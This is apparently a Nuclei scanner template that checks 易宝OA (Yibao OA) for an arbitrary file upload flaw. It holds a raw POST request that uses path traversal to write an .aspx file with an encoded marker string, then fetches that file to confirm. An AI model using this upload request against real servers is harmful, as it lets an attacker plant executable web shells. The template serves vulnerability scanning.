id: yibaoOA-UploadFile-upload
info:
  name: 易宝OA UploadFile存在任意文件上传
  author: apple
  severity: critical
  description: fs后面跟着是 ascii 编码。
  reference:
    - https://mp.weixin.qq.com/s/LQLkTl79kNdtOe_Y06EozQ
    - https://forum.butian.net/share/2776
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /api/files/UploadFile HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 1926

        token=zxh&FileName=/../../manager/{{filename}}.aspx&pathType=1&fs=[119,104,111,105,115,99,101,115,104,105]
      - |+
        GET /{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
